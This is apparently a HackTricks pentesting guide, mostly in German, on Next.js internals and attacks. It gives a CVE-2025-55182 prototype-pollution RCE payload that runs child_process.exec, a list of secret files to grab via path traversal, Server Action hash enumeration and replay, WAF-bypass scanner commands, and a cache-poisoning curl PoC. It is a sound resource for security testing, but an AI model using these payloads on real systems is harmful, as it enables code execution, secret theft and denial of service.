<summary>Webpack-Konfiguration</summary>

Passen Sie Webpack-Konfigurationen für Ihre Next.js-Anwendung an; dabei können unbeabsichtigt Sicherheitslücken entstehen, wenn nicht vorsichtig vorgegangen wird.

#### a. Offenlegen sensibler Module

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problem:**

- **Exposing Sensitive Paths:** Aliasing sensitive directories and allowing client-side access can leak confidential information.
- **Bundling Secrets:** If sensitive files are bundled for the client, their contents become accessible through source maps or inspecting the client-side code.

**How attackers abuse it:**

Angreifer können auf die Verzeichnisstruktur der Anwendung zugreifen oder sie rekonstruieren, wodurch sie möglicherweise sensible Dateien oder Daten finden und ausnutzen.

</details>

### `pages/_app.js` and `pages/_document.js`

#### **`pages/_app.js`**

**Purpose:** Überschreibt die Standard-App-Komponente und ermöglicht globalen State, Styles und Layout-Komponenten.

**Use Cases:**

- Globale CSS einbinden.
- Hinzufügen von Layout-Wrappern.
- Integration von State-Management-Bibliotheken.

**Example:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Zweck:** Überschreibt das Standard-Document und ermöglicht die Anpassung der `<html>`- und `<body>`-Tags.

**Anwendungsfälle:**

- Ändern der `<html>`- oder `<body>`-Tags.
- Hinzufügen von Meta-Tags oder benutzerdefinierten Skripten.
- Integration von Schriftarten von Drittanbietern.

**Beispiel:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Eigener Server (Optional)

**Zweck:** Obwohl Next.js einen eingebauten Server mitbringt, können Sie einen eigenen Server für fortgeschrittene Anwendungsfälle erstellen, z. B. für benutzerdefiniertes Routing oder die Integration in bestehende Backend-Services.

**Hinweis:** Die Verwendung eines eigenen Servers kann die Bereitstellungsoptionen einschränken, insbesondere auf Plattformen wie Vercel, die für den eingebauten Server von Next.js optimiert sind.

**Beispiel:**
```javascript
// server.js
const express = require("express")
const next = require("next")

const dev = process.env.NODE_ENV !== "production"
const app = next({ dev })
const handle = app.getRequestHandler()

app.prepare().then(() => {
const server = express()

// Custom route
server.get("/a", (req, res) => {
return app.render(req, res, "/a")
})

// Default handler
server.all("*", (req, res) => {
return handle(req, res)
})

server.listen(3000, (err) => {
if (err) throw err
console.log("> Ready on http://localhost:3000")
})
})
```
---

## Zusätzliche Architektur- und Sicherheitsüberlegungen

### Umgebungsvariablen und Konfiguration

**Zweck:** Sensible Informationen und Konfigurationseinstellungen außerhalb der Codebasis verwalten.

**Empfohlene Vorgehensweisen:**

- **Verwende `.env`-Dateien:** Speichere Variablen wie API-Schlüssel in `.env.local` (aus der Versionskontrolle ausgeschlossen).
- **Greife sicher auf Variablen zu:** Verwende `process.env.VARIABLE_NAME`, um auf Umgebungsvariablen zuzugreifen.
- **Secrets niemals im Client offenlegen:** Stelle sicher, dass sensible Variablen nur server-side verwendet werden.

**Beispiel:**
```javascript
// next.config.js
module.exports = {
env: {
API_KEY: process.env.API_KEY, // Accessible on both client and server
SECRET_KEY: process.env.SECRET_KEY, // Be cautious if accessible on the client
},
}
```
**Hinweis:** Um Variablen auf serverseitig zu beschränken, lasse sie aus dem `env`-Objekt weg oder stelle sie mit `NEXT_PUBLIC_` voran, damit sie im Client sichtbar sind.

### Nützliche serverseitige Artefakte, die über Path traversal/LFI/download-Endpunkte angegriffen werden sollten

Wenn du einen path traversal oder download API in einer Next.js app findest, ziele auf kompilierte Artefakte, die serverseitige Secrets und Auth-Logik leak:

- `.env` / `.env.local` für Session-Secrets und Provider-Credentials.
- `.next/routes-manifest.json` und `.next/build-manifest.json` für eine vollständige Routenliste.
- `.next/server/pages/api/auth/[...nextauth].js` um die kompilierte NextAuth-Konfiguration wiederherzustellen (enthält oft Fallback-Passwörter, wenn `process.env`-Werte nicht gesetzt sind).
- `next.config.js` / `next.config.mjs` um rewrites, redirects und Middleware-Routing zu überprüfen.

### Authentication and Authorization

**Vorgehensweise:**

- **Sitzungsbasierte Authentifizierung:** Verwende Cookies, um Benutzersitzungen zu verwalten.
- **Token-basierte Authentifizierung:** Setze JWTs für zustandslose Authentifizierung ein.
- **Third-Party Providers:** Integriere OAuth-Anbieter (z. B. Google, GitHub) mit Bibliotheken wie `next-auth`.

**Sicherheitspraktiken:**

- **Secure Cookies:** Setze die Attribute `HttpOnly`, `Secure` und `SameSite`.
- **Password Hashing:** Hash Passwörter immer, bevor du sie speicherst.
- **Input Validation:** Verhindere Injection-Angriffe durch Validierung und Bereinigung von Eingaben.

**Beispiel:**
```javascript
// pages/api/login.js
import { sign } from "jsonwebtoken"
import { serialize } from "cookie"

export default async function handler(req, res) {
const { username, password } = req.body

// Validate user credentials
if (username === "admin" && password === "password") {
const token = sign({ username }, process.env.JWT_SECRET, {
expiresIn: "1h",
})
res.setHeader(
"Set-Cookie",
serialize("auth", token, {
path: "/",
httpOnly: true,
secure: true,
sameSite: "strict",
})
)
res.status(200).json({ message: "Logged in" })
} else {
res.status(401).json({ error: "Invalid credentials" })
}
}
```
### Leistungsoptimierung

**Strategien:**

- **Bildoptimierung:** Verwenden Sie die `next/image`-Komponente von Next.js für automatische Bildoptimierung.
- **Code-Splitting:** Nutzen Sie dynamische Imports, um Code aufzuteilen und die anfänglichen Ladezeiten zu reduzieren.
- **Caching:** Implementieren Sie Caching-Strategien für API-Antworten und statische Assets.
- **Lazy Loading:** Laden Sie Komponenten oder Assets nur, wenn sie benötigt werden.

**Beispiel:**
```jsx
// Dynamic Import with Code Splitting
import dynamic from "next/dynamic"

const HeavyComponent = dynamic(() => import("../components/HeavyComponent"), {
loading: () => <p>Loading...</p>,
})
```
## Next.js Server Actions Enumeration (hash to function name via source maps)

Modernes Next.js verwendet “Server Actions”, die auf dem Server ausgeführt werden, aber vom Client aufgerufen werden. In der Produktion sind diese Aufrufe undurchsichtig: alle POSTs treffen auf einen gemeinsamen Endpoint und werden durch einen build-spezifischen hash unterschieden, der im `Next-Action` Header gesendet wird. Beispiel:
```http
POST /
Next-Action: a9f8e2b4c7d1...
```
Wenn `productionBrowserSourceMaps` aktiviert ist, enthalten minified JS chunks Aufrufe von `createServerReference(...)`, die genug Struktur (plus zugehörige source maps) leaken, um eine Zuordnung zwischen dem action hash und dem ursprünglichen Funktionsnamen wiederherzustellen. Dadurch lassen sich Hashes, die in `Next-Action` beobachtet werden, in konkrete Ziele wie `deleteUserAccount()` oder `exportFinancialData()` übersetzen.

### Extraktionsansatz (regex on minified JS + optional source maps)

Durchsuche heruntergeladene JS chunks nach `createServerReference` und extrahiere den Hash sowie das Funktion-/Source-Symbol. Zwei nützliche Muster:
```regex
# Strict pattern for standard minification
createServerReference\)"([a-f0-9]{40,})",\w+\.callServer,void 0,\w+\.findSourceMapURL,"([^"]+)"\)

# Flexible pattern handling various minification styles
createServerReference[^\"]*"([a-f0-9]{40,})"[^\"]*"([^"]+)"\s*\)
```
- Gruppe 1: server action hash (40+ hex chars)
- Gruppe 2: Symbol oder Pfad, der sich (bei Vorhandensein) über die source map auf die ursprüngliche Funktion auflösen lässt

If the script advertises a source map (trailer comment `//# sourceMappingURL=<...>.map`), fetch it and resolve the symbol/path to the original function name.

### Practical workflow

- Passives Auffinden beim Surfen: Requests mit `Next-Action`-Headers und JS chunk URLs mitschneiden.
- Die referenzierten JS-Bundles und die zugehörigen `*.map`-Dateien (wenn vorhanden) herunterladen.
- Das oben genannte regex ausführen, um ein hash↔name-Wörterbuch zu erstellen.
- Das Wörterbuch zur gezielten Testauswahl verwenden:
- Name-basierte Triage (z. B. `transferFunds`, `exportFinancialData`).
- Coverage über Builds anhand von Funktionsnamen nachverfolgen (Hashes rotieren zwischen Builds).

### Exercising hidden actions (template-based request)

Nimm einen gültigen POST, der im Proxy beobachtet wurde, als Vorlage, und ersetze den `Next-Action`-Wert, um eine andere entdeckte action zu targeten:
```http
# Before
Next-Action: a9f8e2b4c7d1

# After
Next-Action: b7e3f9a2d8c5
```
Replay in Repeater und teste Autorisierung, Eingabevalidierung und Geschäftslogik von ansonsten unerreichbaren Actions.

### Burp automation

- NextjsServerActionAnalyzer (Burp extension) automatisiert das Obige in Burp:
- Durchsucht den Proxy-Verlauf nach JS-Chunks, extrahiert `createServerReference(...)`-Einträge und parst Source Maps, wenn verfügbar.
- Führt ein durchsuchbares hash↔Funktionsnamen-Wörterbuch und de-dupliziert über Builds hinweg anhand des Funktionsnamens.
- Kann ein gültiges Template-POST lokalisieren und einen sendebereiten Repeater-Tab öffnen, in dem der Hash der Ziel-Action eingesetzt ist.
- Repo: https://github.com/Adversis/NextjsServerActionAnalyzer

### Notes and limitations

- Benötigt, dass `productionBrowserSourceMaps` in production aktiviert ist, um Namen aus Bundles/Source Maps wiederherzustellen.
- Die Offenlegung von Funktionsnamen ist für sich genommen keine Schwachstelle; nutze sie, um die Entdeckung zu lenken und die Autorisierung jeder Action zu testen.

### React Server Components Flight protocol deserialization RCE (CVE-2025-55182)

Next.js App Router deployments, die Server Actions auf `react-server-dom-webpack` **19.0.0–19.2.0 (Next.js 15.x/16.x)** exponieren, enthalten eine kritische serverseitige prototype pollution während der Deserialisierung von **Flight**-Chunks. Durch das Einfügen von `$`-Referenzen in eine Flight-Payload kann ein Angreifer von verschmutzten Prototypen zu beliebiger JavaScript-Ausführung und anschließend zu OS-Command-Ausführung innerhalb des Node.js-Prozesses pivotieren.

{{#ref}}
../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/README.md
{{#endref}}

#### Attack chain in Flight chunks

1. **Prototype pollution primitive:** Set `"then": "$1:__proto__:then"` so that the resolver writes a `then` function on `Object.prototype`. Any plain object processed afterwards becomes a thenable, letting the attacker influence async control flow inside RSC internals.
2. **Rebinding to the global `Function` constructor:** Point `_response._formData.get` at `"$1:constructor:constructor"`. During resolution, `object.constructor` → `Object`, and `Object.constructor` → `Function`, so future calls to `_formData.get()` actually execute `Function(...)`.
3. **Code execution via `_prefix`:** Place JavaScript source in `_response._prefix`. When the polluted `_formData.get` is invoked, the framework evaluates `Function(_prefix)(...)`, so the injected JS can run `require('child_process').exec()` or any other Node primitive.

#### Payload skeleton
```json
{
"then": "$1:__proto__:then",
"status": "resolved_model",
"reason": -1,
"value": "{\"then\":\"$B1337\"}",
"_response": {
"_prefix": "require('child_process').exec('id')",
"_chunks": "$Q2",
"_formData": { "get": "$1:constructor:constructor" }
}
}
```
#### Abbildung der React Server Function-Exposition

React Server Functions (RSF) sind alle Funktionen, die die `'use server';` Direktive enthalten. Jede form action, mutation oder fetch helper, die an eine dieser Funktionen gebunden ist, wird zu einem RSC Flight endpoint, das bereitwillig vom Angreifer gelieferte payloads deserialisiert. Nützliche recon-Schritte, abgeleitet aus React2Shell-Assessments:

- **Statische Inventarisierung:** suche nach der Direktive, um zu verstehen, wie viele RSFs vom Framework automatisch exponiert werden.
```bash
rg -n "'use server';" -g"*.{js,ts,jsx,tsx}" app/
```
- **App Router defaults:** `create-next-app` aktiviert standardmäßig den App Router + das Verzeichnis `app/`, wodurch stillschweigend jede Route zu einem RSC-fähigen Endpoint wird. App Router assets wie `/_next/static/chunks/app/` oder Antworten, die Flight chunks über `text/x-component` streamen, sind starke Internet-facing Fingerprints.
- **Implicitly vulnerable RSC deployments:** React’s own advisory weist darauf hin, dass Apps, die die RSC-Runtime ausliefern, ausnutzbar sein können **even without explicit RSFs**, daher sollte jeder Build, der `react-server-dom-*` 19.0.0–19.2.0 verwendet, als verdächtig gelten.
- **Other frameworks bundling RSC:** Vite RSC, Parcel RSC, React Router RSC preview, RedwoodSDK, Waku, etc. reuse den gleichen Serializer und übernehmen dieselbe remote Angriffsfläche, bis sie gepatchte React-Builds einbetten.

#### Version coverage (React2Shell)

- `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`: **anfällig** in 19.0.0, 19.1.0–19.1.1 und 19.2.0; **gepatcht** in 19.0.1, 19.1.2 und 19.2.1 jeweils.
- **Next.js stable:** App Router Releases 15.0.0–16.0.6 enthalten den anfälligen RSC-Stack. Patch trains 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7 beinhalten fixed deps, daher ist jeder Build unter diesen Versionen hochrelevant.
- **Next.js canary:** `14.3.0-canary.77+` liefert ebenfalls die buggy Runtime und hat derzeit keine gepatchten canary drops, wodurch diese Fingerprints starke Exploitation-Kandidaten sind.

#### Remote detection oracle

Assetnote’s [`react2shell-scanner`](https://github.com/assetnote/react2shell-scanner) sends a crafted multipart Flight request to candidate paths and watches server-side behavior:

- **Default mode** führt eine deterministische RCE-Payload aus (mathematische Operation, die via `X-Action-Redirect` reflektiert wird) und beweist damit Codeausführung.
- **`--safe-check` mode** verfälscht die Flight-Nachricht absichtlich so, dass gepatchte Server `200/400` zurückgeben, während verwundbare Ziele `HTTP/500`-Antworten senden, die die Teilzeichenkette `E{"digest"` im Body enthalten. Dieses `(500 + digest)`-Paar ist derzeit das zuverlässigste remote oracle, das von Verteidigern veröffentlicht wurde.
- Eingebaute Schalter `--waf-bypass`, `--vercel-waf-bypass`, und `--windows` passen das Payload-Layout an, prependen Junk oder tauschen OS-Commands aus, sodass du reale Internet-Assets probeen kannst.
```bash
python3 scanner.py -u https://target.tld --path /app/api/submit --safe-check
python3 scanner.py -l hosts.txt -t 20 --waf-bypass -o vulnerable.json
```
### Weitere aktuelle App Router issues (Ende 2025)

1. **RSC DoS & source disclosure (CVE-2025-55184 / CVE-2025-67779 / CVE-2025-55183)** – fehlerhafte Flight payloads können den RSC-Resolver in eine Endlosschleife treiben (pre-auth DoS) oder die Serialisierung von kompiliertem Server Function-Code für andere Aktionen erzwingen. App Router-Builds ≥13.3 sind bis zum Patch betroffen; 15.0.x–16.0.x benötigen die spezifischen Patch-Zeilen aus dem Upstream-Advisory. Wiederverwende den normalen Server Action-Pfad, sende aber einen `text/x-component`-Body mit missbräuchlichen `$`-Verweisen. Hinter einem CDN bleibt die hängende Verbindung durch Cache-Timeouts offen, wodurch der DoS kostengünstig wird.
- **Triage tip:** Ungepatchte Ziele antworten mit `500` und `E{"digest"` nach fehlerhaften Flight payloads; gepatchte Builds antworten mit `400/200`. Teste jeden Endpoint, der bereits Flight-Chunks streamt (suche nach `Next-Action`-Headern oder `text/x-component`-Antworten) und wiederhole mit einem modifizierten Payload.

2. **RSC cache poisoning (CVE-2025-49005, App Router 15.3.0–15.3.2)** – ein fehlender `Vary`-Header ließ eine `Accept: text/x-component`-Antwort cachen und an Browser ausliefern, die HTML erwarteten. Eine einzige Priming-Anfrage kann die Seite durch rohe RSC-Payloads ersetzen. PoC flow:
```bash
# Prime CDN with an RSC response
curl -k -H "Accept: text/x-component" "https://target/app/dashboard" > /dev/null
# Immediately fetch without Accept (victim view)
curl -k "https://target/app/dashboard" | head
```
Wenn die zweite Antwort JSON-Flight-Daten statt HTML zurückgibt, ist die Route für Cache poisoning angreifbar. Cache nach dem Test leeren.

## References

- [Pentesting Next.js Server Actions — A Burp Extension for Hash-to-Function Mapping](https://www.adversis.io/blogs/pentesting-next-js-server-actions)
- [NextjsServerActionAnalyzer (Burp extension)](https://github.com/Adversis/NextjsServerActionAnalyzer)
- [CVE-2025-55182 React Server Components Remote Code Execution Exploit Tool](https://github.com/Spritualkb/CVE-2025-55182-exp)
- [CVE-2025-55182 & CVE-2025-66478 React2Shell – All You Need to Know](https://jfrog.com/blog/2025-55182-and-2025-66478-react2shell-all-you-need-to-know/)
- [0xdf – HTB Previous (Next.js middleware bypass, static export recon, NextAuth config leak)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [assetnote/react2shell-scanner](https://github.com/assetnote/react2shell-scanner)
- [Next.js Security Update: December 11, 2025 (CVE-2025-55183/55184/67779)](https://nextjs.org/blog/security-update-2025-12-11)
- [GHSA-r2fc-ccr8-96c4 / CVE-2025-49005: App Router cache poisoning](https://github.com/advisories/GHSA-r2fc-ccr8-96c4)

{{#include ../../banners/hacktricks-training.md}}
